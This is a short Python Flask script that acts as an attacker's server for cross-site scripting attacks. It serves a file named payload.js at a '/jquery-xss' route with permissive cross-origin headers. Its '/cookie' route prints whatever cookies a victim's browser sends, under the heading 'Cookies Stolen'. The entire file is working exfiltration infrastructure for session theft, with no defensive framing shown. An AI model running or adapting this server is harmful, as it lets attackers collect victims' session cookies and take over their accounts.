from flask import Flask, request, send_from_directory, make_response

app = Flask(__name__)

headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'X-Requested-With',
    'Access-Control-Allow-Credentials': 'true',
}

@app.route('/jquery-xss')
def jqueryxss():
    response = make_response(send_from_directory('js', 'payload.js'))
    for key, val in headers.iteritems():
        response.headers.add_header(key, val)
    return response

@app.route('/cookie')
def cookie_steal():
    print '\nCookies Stolen'
    print '-----------------------------------'
    for cookie, val in request.args.to_dict().iteritems():
        print '%s -> %s' % (cookie, val)
    print '-----------------------------------'
    print ''

    response = make_response('ok')
    for key, val in headers.iteritems():
        response.headers.add_header(key, val)
    return response

if __name__ == '__main__':
    context = ('cert.pem', 'key.pem')
    app.run(host='0.0.0.0', port=4443, ssl_context=context, threaded=True)
